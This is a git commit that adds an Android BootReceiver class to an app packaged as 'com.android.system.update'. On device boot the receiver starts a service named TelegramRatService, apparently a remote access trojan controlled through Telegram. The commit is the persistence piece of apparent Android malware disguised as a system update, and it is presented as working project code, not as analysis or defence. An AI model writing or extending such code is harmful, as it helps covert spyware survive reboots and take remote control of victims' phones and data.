bd66391d6a7ae9d4e2f8d300ca1dd08213a25d4a
seriyserega <belomestnovasergej@gmail.com>
2026-07-31 00:59:55 +0900

    Create BootReceiver.kt

---
+++ app/src/main/java/com/android/system/update/BootReceiver.kt
@@ -0,0 +1,11 @@
+package com.android.system.update
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+class BootReceiver : BroadcastReceiver() {
+    override fun onReceive(context: Context, intent: Intent) {
+        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
+            context.startService(Intent(context, TelegramRatService::class.java))
+        }
+    }
+}
